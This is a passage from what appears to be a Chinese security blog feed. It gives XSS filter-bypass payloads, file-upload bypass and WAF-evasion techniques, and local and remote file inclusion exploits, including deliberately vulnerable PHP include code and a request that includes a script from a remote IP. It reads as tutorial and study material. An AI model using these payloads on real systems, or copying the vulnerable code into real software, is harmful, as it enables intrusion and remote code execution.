<h4 id="0x02-反引号替换"><a href="#0x02-反引号替换" class="headerlink" title="0x02. 反引号替换"></a>0x02. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="alert-过滤绕过"><a href="#alert-过滤绕过" class="headerlink" title="alert 过滤绕过"></a>alert 过滤绕过</h3><h4 id="0x01-prompt-替换"><a href="#0x01-prompt-替换" class="headerlink" title="0x01. prompt 替换"></a>0x01. prompt 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-confirm-替换"><a href="#0x02-confirm-替换" class="headerlink" title="0x02. confirm 替换"></a>0x02. confirm 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-console-log-替换"><a href="#0x03-console-log-替换" class="headerlink" title="0x03. console.log 替换"></a>0x03. console.log 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x04-document-write-替换"><a href="#0x04-document-write-替换" class="headerlink" title="0x04. document.write 替换"></a>0x04. document.write 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x05-base64-绕过"><a href="#0x05-base64-绕过" class="headerlink" title="0x05. base64 绕过"></a>0x05. base64 绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;Function`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;``.constructor.constructor`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br></pre></td></tr></table></figure>





<h3 id="关键词置空绕过"><a href="#关键词置空绕过" class="headerlink" title="关键词置空绕过"></a>关键词置空绕过</h3><h4 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01. 大小写绕过"></a>0x01. 大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以转换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ScRiPt&gt;AlErT(/xss/)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-双写绕过"><a href="#0x02-双写绕过" class="headerlink" title="0x02. 双写绕过"></a>0x02. 双写绕过</h4><p>嵌套<script>和</script>突破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以转换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>



<h3 id="函数拼接"><a href="#函数拼接" class="headerlink" title="函数拼接"></a>函数拼接</h3><h4 id="0x01-eval"><a href="#0x01-eval" class="headerlink" title="0x01. eval"></a>0x01. eval</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-top"><a href="#0x02-top" class="headerlink" title="0x02. top"></a>0x02. top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-window"><a href="#0x03-window" class="headerlink" title="0x03. window"></a>0x03. window</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x04-self"><a href="#0x04-self" class="headerlink" title="0x04. self"></a>0x04. self</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x05-parent"><a href="#0x05-parent" class="headerlink" title="0x05. parent"></a>0x05. parent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-frames"><a href="#0x06-frames" class="headerlink" title="0x06. frames"></a>0x06. frames</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x07-常用函数"><a href="#0x07-常用函数" class="headerlink" title="0x07. 常用函数"></a>0x07. 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="赋值拼接"><a href="#赋值拼接" class="headerlink" title="赋值拼接"></a>赋值拼接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2023/04/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h1><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获取执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果，产生文件上传漏洞。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在 进程服务器上执行任意PHP脚本</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>1、上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</p>
<p>2、上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动化运行。</p>
<p>3、上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域 下的行为(其他通过类似方式控制策略文件的情况类似)。</p>
<p>4、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p>
<p>5、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块，或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过”本地文件包含漏洞(Local File Include)”执行此脚本。</p>
<h2 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h2><p>能够被web容器解释执行</p>
<p>能够从web访问这个文件</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过 url 去 访问以执行代码。</p>
<p>1、服务器配置不当</p>
<p>2、开源编辑器上传漏洞</p>
<p>3、本地文件上传限制被绕过</p>
<p>4、过滤不严格被绕过</p>
<p>5、文件解析漏洞导致文件执行</p>
<p>6、文件路径截断</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1、客服端绕过"><a href="#1、客服端绕过" class="headerlink" title="1、客服端绕过"></a>1、客服端绕过</h3><p>一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg&#x2F;.jpeg&#x2F;.png后缀名的文件，而此时并没有发送数据包。</p>
<p>绕过方法:</p>
<p>1、通过火狐插件 NOscript 插件或者禁用 IE 中 JS 脚本；</p>
<p>2、通过 firbug 插件元素审核修改代码（如删除 onsubmit&#x3D;”return checkFile()” 事件）；</p>
<p>3、通过 firbug 元素审核 javascirpt 脚本中添加上传文件类型；</p>
<p>4、通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为asp&#x2F;php&#x2F;jsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改。</p>
<h3 id="2、服务端绕过"><a href="#2、服务端绕过" class="headerlink" title="2、服务端绕过"></a>2、服务端绕过</h3><p>（1）黑名单扩展名绕过</p>
<p>黑名单检测：</p>
<p>一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：</p>
<p>（1）找黑名单扩展名的漏网之鱼 - 比如 iis6.0 中的 asa 和 cer （2）可能存在大小写绕过漏洞 - 比如 aSp(iis6.0 中可以）和 pHp（只能在 小于 php5.3.39 中的 linux 中）之中 （3）能被web容器解析的文件其他扩展名列表：</p>
<p>jsp, jspx ,jspf*7                                                                                                                              </p>
<p>asp asa cer cdx,htr,xml,html</p>
<p>aspx,ashx,asmx,asax,ascx</p>
<p>（2）黑名单特殊后缀名绕过（利用难度高）</p>
<p>将Burpsuite截获的数据包中backlion.php名字改为 baclion.php4(php1,php2,php3,php4,php5), 前提条件是 http.conf 中设置 AddType application&#x2F;x-httpd-php .php1(php 的版本小于等于 5.3.29 以下)</p>
<p>（3）单双重后缀名绕过</p>
<p>上传时将 Burpsuite 截的数据包中文件名 backlion.php（backlion.asa)改 为 backlion.pphphph(backlion.asasaa)，那么过滤了第一个”php”字符串”后， 开头的’p’和结尾的’hp’就组合又形成了 php</p>
<p>（4）服务端 MIME 文件类型(Content-Type)绕过</p>
<p>MIME 的作用：</p>
<p>使客户端软件，区分不同种类的数据，例如web浏览器就是通过 MIME 类 型来判断文件是GIF图片，还是可打印的 PostScript 文件。web服务器使用 MIME 来说明发送数据的种类，web客户端使用 MIME 来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式的重要标记项。</p>
<p>常用的文件上传类型的 MIME 表： text&#x2F;plain（纯文本） text&#x2F;html（HTML 文档） text&#x2F;javascript（js 代码） application&#x2F;xhtml+xml（XHTML 文档） image&#x2F;gif（GIF 图像） image&#x2F;jpeg（JPEG 图像） image&#x2F;png（PNG 图像） video&#x2F;mpeg（MPEG 劢画） application&#x2F;octet-stream（二迚制数据） application&#x2F;pdf（PDF 文档） application&#x2F;(编程语言) 该种语言的代码 application&#x2F;msword（Microsoft Word 文件） message&#x2F;rfc822（RFC 822 形式） multipart&#x2F;alternative（HTML 邮件的 HTML 形式和纯文本形式，相同内容使 用不同形式表示） application&#x2F;x-www-form-urlencoded（POST 方法提交的表单）multipart&#x2F;form-data（POST 提交时伴随文件上传的表单）</p>
<p>绕过方法：上传对文件类型做了限制，可通过 burpsuit 将其他类文件类型 修改为如：Content-Type：image&#x2F;gif 和 image&#x2F;jpeg 等运行的文件类型。</p>
<h3 id="3-白名单绕过："><a href="#3-白名单绕过：" class="headerlink" title="3.白名单绕过："></a>3.白名单绕过：</h3><p>（1）配合web容器的解析漏洞：</p>
<p>IIS中的目录解析漏洞和分号解析漏洞 ：</p>
<p>将一句话木马的文件名后缀.php，改成.php.abc(不被解析的后缀名)。首先， 服务器验证文件扩展名的时候，验证的是.abc，只要该扩展名符合服务器端黑白名单规则，即可上传。</p>
<p>nginx 空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行。</p>
<p>apache 的解析漏洞，上传如 a.php.rar a.php.gif 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的。</p>
<p>（2）%00 截断上传绕过</p>
<p>通过抓包截断将.asp.jpg 后面的一个.换成%00 在上传的时候即.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将.asp.jpg 的内容写入到.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截断上传漏洞，上传格式如下：.asp%00.jpg</p>
<h2 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h2><h3 id="1-上传文件-WAF-检查的位置"><a href="#1-上传文件-WAF-检查的位置" class="headerlink" title="1.上传文件 WAF 检查的位置"></a>1.上传文件 WAF 检查的位置</h3><p>文件名：解析文件名，判断是否在黑名单内。文件内容：解析文件内容，判断是否为 webshell 文件目录权限 请求的 url Boundary 边界 MIME 文件类型目前，市面上常见的是解析文件名，少数 WAF 是解析文件内容，比如长亭。</p>
<h3 id="2-文件上传存在的上传特征"><a href="#2-文件上传存在的上传特征" class="headerlink" title="2.文件上传存在的上传特征"></a>2.文件上传存在的上传特征</h3><p>http 请求 Header 头部中的 Content-Type 存在以下特征：</p>
<p>multipart&#x2F;form-data:表示该请求是一个文件上传请求存在boundary字符串 : 作用为分隔符，以区分 POST 数据 。POST 的内容存在以下特征： Content-Disposition name filename POST 中的 boundary 的值就是 Content-Type 的值在最前面加了两个–，除了 最后 标识结束的 boundary 最后标识结束的 boundary 最后默认会多出两个–（测试时，最后一行的 boundary 删掉也能成功上传）。</p>
<h3 id="3-绕过-WAF-文件上传的方法"><a href="#3-绕过-WAF-文件上传的方法" class="headerlink" title="3.绕过 WAF 文件上传的方法"></a>3.绕过 WAF 文件上传的方法</h3><p>（1）填充垃圾数据绕过</p>
<p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验；’ Content-Type 类型数据后添加垃圾数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">a=11111111111111111111111111111111111111111111111111111111</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryYijPw9QB0WlswSL2</span><br><span class="line"></span><br><span class="line">a=111111111111111111111111111111111111111111111111111111111111111111111               </span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;bk.jpg&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>

<p>（2）文件扩展名出回车绕过（只支持 php）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph</span><br><span class="line"></span><br><span class="line">p&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; file</span><br><span class="line"></span><br><span class="line">name=&quot;bk.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>

<p>又或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; fi</span><br><span class="line"></span><br><span class="line">lename=&quot;bk.php&quot; Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>

<p>（3）filename 绕过</p>
<p>添加一个 finame 参数：</p>
<p>针对早期版本安全狗，可以多加一个 filename 在一个 Content-Disposition 中，存在多个 filename ，协议解析应该使用最 后的filename 值作为文件名。如果 WAF 解析到 filename&#x3D;”bk.jpg”认为解析 到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是 bk.asp。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;;</span><br><span class="line"></span><br><span class="line">filename=&quot;bk.jpg&quot;;filename=&quot;bk.asp&quot;</span><br></pre></td></tr></table></figure>

<p>（4）修改 Content-Disposition 字段值的大小写绕过</p>
<p>对这三个固定的字换:Content-Disposition,name,filename 比如 name 转换成 Name，Content-Disposition 转换成 content-disposition。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;bk.php&quot;</span><br></pre></td></tr></table></figure>



<p>改成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.php&quot;</span><br></pre></td></tr></table></figure>

<p>（5）文件重命名绕过</p>
<p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name&#x3D;”  file1”;</p>
<p>filename&#x3D;”bk……………………………………………………………………………………………………..</p>
<p>………………………………………………………………………………………………asp”。</p>
<p>（6）删除 Content-Disposition 值的 form-data 绕过</p>
<p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename= &quot;bk.php&quot;</span><br></pre></td></tr></table></figure>



<p>改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file1&quot;; filename= &quot;bk.php&quot;</span><br></pre></td></tr></table></figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、在服务器后端对上传的文件进行过滤。</p>
<p>2、白名单。</p>
]]></content>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2023/04/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20/</url>
    <content><![CDATA[<h1 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a>文件包含漏洞简介</h1><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件。</p>
<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>PHP中文件包含函数有以下四种：</p>
<blockquote>
<p>require()</p>
<p>require_once()</p>
<p>include()</p>
<p>include_once()</p>
</blockquote>
<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p>示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过目录遍历漏洞可以获取到系统中其他文件的内容</p>
<h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p><strong>利用条件：</strong></p>
<p>session的存储位置可以获取。</p>
<p>通过phpinfo的信息可以获取到session的存储位置。</p>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpsession_start();$ctfs=$_GET[&#x27;ctfs&#x27;];$_SESSION[&quot;username&quot;]=$ctfs;?&gt;</span><br></pre></td></tr></table></figure>

<p>此php会将获取到的GET型ctfs变量的值存入到session中</p>
<p>当访问<a href="http://xxx/session.php?ctfs=ctfs">http://xxx/session.php?ctfs=ctfs</a> 后，会在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下存储session的值。</p>
<p>ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p>
<h3 id="本地文件包含漏洞绕过"><a href="#本地文件包含漏洞绕过" class="headerlink" title="本地文件包含漏洞绕过"></a>本地文件包含漏洞绕过</h3><p><strong>%00截断</strong></p>
<p>条件：magic_quotes_gpc &#x3D; Off php版本&lt;5.3.4</p>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>



<p><strong>路径长度截断</strong></p>
<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
<blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
</blockquote>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan><br></pre></td></tr></table></figure>



<p><strong>点号截断</strong></p>
<p>条件：windows OS，点号需要长于256</p>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txtspan><br></pre></td></tr></table></figure>

<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<blockquote>
<p>allow_url_fopen &#x3D; On（是否允许打开远程文件）</p>
<p>allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）</p>
</blockquote>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过远程文件包含漏洞，包含php.txt可以解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</span><br></pre></td></tr></table></figure>

<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure>

<h3 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</span><br></pre></td></tr></table></figure>

<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
<h3 id="php-x2F-x2F-输入输出流"><a href="#php-x2F-x2F-输入输出流" class="headerlink" title="php:&#x2F;&#x2F; 输入输出流"></a>php:&#x2F;&#x2F; 输入输出流</h3><p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<h3 id="php-x2F-x2F-filter（本地磁盘文件进行读取）"><a href="#php-x2F-x2F-filter（本地磁盘文件进行读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）"></a>php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</h3><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
<p>用法：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php ?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php 一样。</p>
<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>
<p><strong>测试代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
